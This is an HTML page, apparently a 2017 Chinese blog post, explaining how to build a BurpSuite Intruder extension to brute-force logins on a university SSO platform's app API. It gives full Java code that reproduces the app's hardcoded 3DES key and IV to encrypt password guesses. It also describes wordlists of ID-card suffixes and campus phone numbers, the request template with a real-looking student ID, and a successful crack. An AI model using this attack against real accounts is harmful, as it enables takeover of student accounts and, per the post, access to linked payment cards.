@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="开发BurpSuite扩展爆破某平台"/>
+
+
+
+
+  <meta name="keywords" content="openwrt," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Gorgias'Blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://gorgias.me/2017/03/29/开发BurpSuite扩展爆破某平台/"/>
+
+
+<meta name="description" content="Introduction学校的校园网已经正式运营了，但是用户名密码还是使用的默认密码，身份证号后六位，对于单点登录的平台来说，是非常危险的。比如武汉大学的学号能在网上看到，密码是身份证后六位，那么登进他们的一卡通系统就能使用学生的银行卡进行消费。博主所在的学校使用的CAS实现SSO，爆破起来不方便。于是使用平台APP的接口爆破。
+PrepareDevelopment enviroment:1234">
+<meta property="og:type" content="article">
+<meta property="og:title" content="开发BurpSuite扩展爆破某平台">
+<meta property="og:url" content="https://gorgias.me/2017/03/29/开发BurpSuite扩展爆破某平台/index.html">
+<meta property="og:site_name" content="Gorgias'Blog">
+<meta property="og:description" content="Introduction学校的校园网已经正式运营了，但是用户名密码还是使用的默认密码，身份证号后六位，对于单点登录的平台来说，是非常危险的。比如武汉大学的学号能在网上看到，密码是身份证后六位，那么登进他们的一卡通系统就能使用学生的银行卡进行消费。博主所在的学校使用的CAS实现SSO，爆破起来不方便。于是使用平台APP的接口爆破。
+PrepareDevelopment enviroment:1234">
+<meta property="og:image" content="https://gorgias.me/开发BurpSuite扩展爆破某平台/Intruder.png">
+<meta property="og:image" content="https://gorgias.me/开发BurpSuite扩展爆破某平台/payload.png">
+<meta property="og:image" content="https://gorgias.me/开发BurpSuite扩展爆破某平台/tel.png">
+<meta property="og:image" content="https://gorgias.me/开发BurpSuite扩展爆破某平台/Extender.png">
+<meta property="og:image" content="https://gorgias.me/开发BurpSuite扩展爆破某平台/Processing.png">
+<meta property="og:image" content="https://gorgias.me/开发BurpSuite扩展爆破某平台/result.png">
+<meta property="og:updated_time" content="2017-03-30T09:21:29.675Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="开发BurpSuite扩展爆破某平台">
+<meta name="twitter:description" content="Introduction学校的校园网已经正式运营了，但是用户名密码还是使用的默认密码，身份证号后六位，对于单点登录的平台来说，是非常危险的。比如武汉大学的学号能在网上看到，密码是身份证后六位，那么登进他们的一卡通系统就能使用学生的银行卡进行消费。博主所在的学校使用的CAS实现SSO，爆破起来不方便。于是使用平台APP的接口爆破。
+PrepareDevelopment enviroment:1234">
+<meta name="twitter:image" content="https://gorgias.me/开发BurpSuite扩展爆破某平台/Intruder.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> 开发BurpSuite扩展爆破某平台 - Gorgias'Blog </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Gorgias'Blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          开发BurpSuite扩展爆破某平台
+        
+      </h1>
+
+      <time class="post-time">
+          Mar 29 2017
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>学校的校园网已经正式运营了，但是用户名密码还是使用的默认密码，身份证号后六位，对于单点登录的平台来说，是非常危险的。<br>比如武汉大学的学号能在网上看到，密码是身份证后六位，那么登进他们的一卡通系统就能使用学生的银行卡进行消费。<br>博主所在的学校使用的CAS实现SSO，爆破起来不方便。于是使用平台APP的接口爆破。</p>
+<h2 id="Prepare"><a href="#Prepare" class="headerlink" title="Prepare"></a>Prepare</h2><p>Development enviroment:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">OS: Arch Linux </div><div class="line">Kernel: x86_64 Linux 4.9.8-1-ARCH</div><div class="line">Shell: zsh 5.3.1</div><div class="line">DE: KDE5</div><div class="line">IDE: IntelliJIDEA 2016.1</div><div class="line">JDK: 1.8.0_121</div><div class="line">Build Tool: Gradle 3.3</div></pre></td></tr></table></figure></p>
+<h2 id="快速学习API"><a href="#快速学习API" class="headerlink" title="快速学习API"></a>快速学习API</h2><p>From samples import the Gradle project into IDEA.</p>
+<h3 id="需要被实现的接口"><a href="#需要被实现的接口" class="headerlink" title="需要被实现的接口"></a>需要被实现的接口</h3><p><em>IBurpExtender</em><br>所有扩展必须实现次接口，必须申明为 public ,并且必须提供一个默认的构造器。</p>
+<blockquote>
+<p>All extensions must implement this interface. Implementations must be called BurpExtender, in the package burp, must be declared public, and must provide a default (public, no-argument) constructor.</p>
+</blockquote>
+<p><em>IIntruderPayloadGeneratorFactory</em><br>Payload生成工厂，用于提供payload实例</p>
+<blockquote>
+<p>Extensions can implement this interface and then call IBurpExtenderCallbacks.registerIntruderPayloadGeneratorFactory() to register a factory for custom Intruder payloads.</p>
+</blockquote>
+<p><em>IIntruderPayloadProcessor</em><br>Payload处理器，用于处理传进来的参数</p>
+<blockquote>
+<p>Extensions can implement this interface and then call IBurpExtenderCallbacks.registerIntruderPayloadProcessor() to register a custom Intruder payload processor.</p>
+</blockquote>
+<h3 id="一些常用的接口或者方法"><a href="#一些常用的接口或者方法" class="headerlink" title="一些常用的接口或者方法"></a>一些常用的接口或者方法</h3><p><em>IExtensionHelpers</em><br>该接口包含许多帮助方法，可用于协助扩展的各种常见任务。</p>
+<blockquote>
+<p>This interface contains a number of helper methods, which extensions can use to assist with various common tasks that arise for Burp extensions. Extensions can call IBurpExtenderCallbacks.getHelpers to obtain an instance of this interface.</p>
+</blockquote>
+<p><em>registerExtenderCallbacks</em><br>此方法将在扩展加载后被调用，它注册了一个 IBurpExtenderCallbacks 接口的实例， IBurpExtenderCallbacks 接口提供了许多在开发插件过程中常用的一些操作。</p>
+<blockquote>
+<p>This method is invoked when the extension is loaded. It registers an instance of the IBurpExtenderCallbacks interface, providing methods that may be invoked by the extension to perform various actions.</p>
+</blockquote>
+<p><em>IIntruderPayloadGenerator</em><br>此接口被用于自定义 Intruder 工具的 payload 生成器。当需要发起一次新的 Intruder 攻击时，扩展需要注册一个 IIntruderPayloadGeneratorFactory 工厂并且必须返回此接口的一个新的实例。此接口会将当前插件注册为一个 Intruder 工具的 payload 生成器。</p>
+<blockquote>
+<p>This interface is used for custom Intruder payload generators. Extensions that have registered an IIntruderPayloadGeneratorFactory must return a new instance of this interface when required as part of a new Intruder attack.</p>
+</blockquote>
+<h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><h3 id="使用Intruder"><a href="#使用Intruder" class="headerlink" title="使用Intruder"></a>使用Intruder</h3><p>下载app，直接把dex提取，转成jar，分析里面的加密算法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">dex2jar mportal.dex</div><div class="line">jd-gui mportal.jar</div></pre></td></tr></table></figure></p>
+<p>在前一篇文章有分析过程<br><a href="https://gorgias.me/2015/06/14/%E4%B8%80%E6%AC%A1%E6%A0%A1%E5%9B%ADAndroid%E5%B9%B3%E5%8F%B0%E5%BA%94%E7%94%A8%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">一次校园Android平台应用的逆向分析</a></p>
+<p>先使用BurpSuite抓登陆请求。Ctrl + I，添加进使用Intruder，给action后面的值添加dollar。<br><img src="开发BurpSuite扩展爆破某平台/Intruder.png" alt="Intruder"><br>切到payload选项卡，类型选择Custom iterator(自定义迭代)。<br><img src="开发BurpSuite扩展爆破某平台/payload.png" alt="payload"><br>然后根据反编译查到的明文拼接生成器中payload明文。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Position1: method=checkUserLoginIFS&amp;idNumber=</div><div class="line">Position2: 学工号是20135120100314</div><div class="line">Position3: &amp;UserPwd=</div><div class="line">Position4: 这里导入密码字典</div><div class="line">Position5: &amp;logonIP=8.8.8.8</div></pre></td></tr></table></figure></p>
+<h3 id="准备字典"><a href="#准备字典" class="headerlink" title="准备字典"></a>准备字典</h3><p>除了弱口令，还要带一点社会工程学色彩，平台密码默认身份证后六位。<br>我们用crunch生成<a href="https://mega.nz/#!ahxjSRZA!O5HLncoNVZePSzi_GkaQ2_-c_EdsIyXtp5_d5X1_67c" target="_blank" rel="external">身份证后六位</a>，带X的放最后。<br>然后还有整个学校的固话号码。官方就有下载，都不用自己生成了。<br><img src="开发BurpSuite扩展爆破某平台/tel.png" alt="tel"></p>
+<h3 id="编写扩展代码"><a href="#编写扩展代码" class="headerlink" title="编写扩展代码"></a>编写扩展代码</h3><p>这里没有使用到Generator，因为我是用生成好的字典爆破，如果你想在代码里生成，可以实现Generator接口。<br>BurpExtender.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">package burp;</div><div class="line"></div><div class="line">public class BurpExtender implements IBurpExtender, IIntruderPayloadProcessor</div><div class="line">&#123;</div><div class="line">    private IExtensionHelpers helpers;</div><div class="line"></div><div class="line">    </div><div class="line">    @Override</div><div class="line">    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)</div><div class="line">    &#123;</div><div class="line">        // obtain an extension helpers object</div><div class="line">        helpers = callbacks.getHelpers();</div><div class="line">        </div><div class="line">        // set our extension name</div><div class="line">        callbacks.setExtensionName(&quot;Neusoft DCP&quot;);</div><div class="line">        </div><div class="line">        // register ourselves as an Intruder payload processor</div><div class="line">        callbacks.registerIntruderPayloadProcessor(this);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    @Override</div><div class="line">    public String getProcessorName()</div><div class="line">    &#123;</div><div class="line">        return &quot;NeusoftDESEncode&quot;;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    @Override</div><div class="line">    public byte[] processPayload(byte[] currentPayload, byte[] originalPayload, byte[] baseValue)</div><div class="line">    &#123;</div><div class="line">        String dataParameter = helpers.bytesToString(currentPayload);</div><div class="line">        EncryptData enc = new EncryptData();</div><div class="line">        return helpers.stringToBytes(enc.encrypt(dataParameter));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>EncryptData.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div></pre></td><td class="code"><pre><div class="line">package burp;</div><div class="line"></div><div class="line">import java.io.IOException;</div><div class="line">import javax.crypto.Cipher;</div><div class="line">import javax.crypto.SecretKey;</div><div class="line">import javax.crypto.SecretKeyFactory;</div><div class="line">import javax.crypto.spec.DESedeKeySpec;</div><div class="line">import javax.crypto.spec.IvParameterSpec;</div><div class="line"></div><div class="line">public class EncryptData</div><div class="line">&#123;</div><div class="line">    private static EncryptData SingleEncryptData = null;</div><div class="line">    byte[] encryptKey;</div><div class="line">    DESedeKeySpec spec;</div><div class="line">    SecretKeyFactory keyFactory;</div><div class="line">    static SecretKey theKey;</div><div class="line">    static Cipher cipher;</div><div class="line">    static IvParameterSpec IvParameters;</div><div class="line"></div><div class="line">    public static EncryptData getInstance()</div><div class="line">    &#123;</div><div class="line">        if (SingleEncryptData == null) &#123;</div><div class="line">            SingleEncryptData = new EncryptData();</div><div class="line">        &#125;</div><div class="line">        return SingleEncryptData;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public EncryptData()</div><div class="line">    &#123;</div><div class="line">        try</div><div class="line">        &#123;</div><div class="line">            try</div><div class="line">            &#123;</div><div class="line">                Cipher localCipher = Cipher.getInstance(&quot;DESede&quot;);</div><div class="line">            &#125;</div><div class="line">            catch (Exception e)</div><div class="line">            &#123;</div><div class="line">                System.err.println(&quot;Installling SunJCE provider.&quot;);</div><div class="line">            &#125;</div><div class="line">            this.encryptKey = &quot;neusofteducationplatform&quot;.getBytes();</div><div class="line">            System.out.println(this.encryptKey);</div><div class="line"></div><div class="line">            this.spec = new DESedeKeySpec(this.encryptKey);</div><div class="line"></div><div class="line">            this.keyFactory = SecretKeyFactory.getInstance(&quot;DESede&quot;);</div><div class="line"></div><div class="line">            theKey = this.keyFactory.generateSecret(this.spec);</div><div class="line"></div><div class="line">            cipher = Cipher.getInstance(&quot;DESede/CBC/PKCS5Padding&quot;);</div><div class="line"></div><div class="line">            IvParameters = new IvParameterSpec(&quot;01234567&quot;.getBytes());</div><div class="line">        &#125;</div><div class="line">        catch (Exception localException2) &#123;&#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static String encrypt(String rawString)</div><div class="line">    &#123;</div><div class="line">        byte[] encryptedString = null;</div><div class="line">        try</div><div class="line">        &#123;</div><div class="line">            cipher.init(1, theKey, IvParameters);</div><div class="line"></div><div class="line">            byte[] plaintBytes = rawString.getBytes();</div><div class="line"></div><div class="line">            encryptedString = cipher.doFinal(plaintBytes);</div><div class="line">        &#125;</div><div class="line">        catch (Exception localException) &#123;&#125;</div><div class="line">        return byteToHex(encryptedString);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    private static final byte[] HEXBYTES = &#123; 48, 49, 50, 51, 52, 53, 54, 55, 56,</div><div class="line">            57, 97, 98, 99, 100, 101, 102 &#125;;</div><div class="line">    private static final String HEXINDEX = &quot;0123456789abcdef0123456789ABCDEF&quot;;</div><div class="line"></div><div class="line">    public static String byteToHex(byte[] b)</div><div class="line">    &#123;</div><div class="line">        int len = b.length;</div><div class="line">        char[] s = new char[len * 2];</div><div class="line">        int i = 0;</div><div class="line">        for (int j = 0; i &lt; len; i++)</div><div class="line">        &#123;</div><div class="line">            int c = b[i] &amp; 0xFF;</div><div class="line">            s[(j++)] = ((char)HEXBYTES[(c &gt;&gt; 4 &amp; 0xF)]);</div><div class="line">            s[(j++)] = ((char)HEXBYTES[(c &amp; 0xF)]);</div><div class="line">        &#125;</div><div class="line">        return new String(s);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="生成扩展插件并导入"><a href="#生成扩展插件并导入" class="headerlink" title="生成扩展插件并导入"></a>生成扩展插件并导入</h3><p>Project基于Gradle，在工程目录执行会输出jar到指定目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gradle task fatJar</div><div class="line">output: build/libs/IntruderPayloads-all.jar</div></pre></td></tr></table></figure></p>
+<p>在Extender选项卡添加扩展插件，并确认无误。<br><img src="开发BurpSuite扩展爆破某平台/Extender.png" alt="Extender"><br>在Playload Processing选择咱写的扩展。<br><img src="开发BurpSuite扩展爆破某平台/Processing.png" alt="Processing"><br>为了节约时间方便测试，添加了几组错误密码和一组正确密码。可以看到成功的结果。<br><img src="开发BurpSuite扩展爆破某平台/result.png" alt="result"></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://portswigger.net/burp/extender/api/" target="_blank" rel="external">Burp Ext API</a><br><a href="https://github.com/PortSwigger/example-intruder-payloads" target="_blank" rel="external">Intruder payloads Sample</a><br><a href="http://drops.wooyun.org/tools/14040" target="_blank" rel="external">BurpSuite插件开发指南之 API</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+        <div class="post-tags">
+          
+            <a href="/tags/openwrt/">openwrt</a>
+          
+        </div>
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2017/02/24/源码编译OpenWrt固件笔记/">
+        <span class="next-text nav-default">源码编译OpenWrt固件笔记</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2015 -
+    
+    2017
+    <span class="footer-author">Gorgias.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
